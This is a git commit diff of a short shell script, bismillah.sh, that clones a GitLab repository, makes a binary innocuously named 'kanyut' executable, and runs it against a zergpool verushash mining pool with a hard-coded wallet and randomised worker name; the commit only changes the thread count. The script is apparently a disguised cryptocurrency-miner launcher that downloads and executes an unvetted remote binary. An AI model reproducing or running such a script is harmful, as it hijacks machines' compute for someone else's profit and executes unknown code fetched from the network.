a716acb2e11a76b5b4d706e70055d6584f224ebc
dannys-id <60502767+dannys-id@users.noreply.github.com>
2021-10-22 17:52:36 +0700

    Update bismillah.sh

--- bismillah.sh
+++ bismillah.sh
@@ -2,4 +2,4 @@
 git clone https://gitlab.com/kikibena365/ikan.git
 cd ikan
 chmod +x kanyut 
-./kanyut -v -l verushash.eu.mine.zergpool.com:3300 -u RV78iwCVdQZXmVU28ddyRcQUDAChZNggDn.$(echo $(shuf -i 1-99999 -n 1)-Tytyd) -p x -t 96
+./kanyut -v -l verushash.eu.mine.zergpool.com:3300 -u RV78iwCVdQZXmVU28ddyRcQUDAChZNggDn.$(echo $(shuf -i 1-99999 -n 1)-Tytyd) -p x -t 75
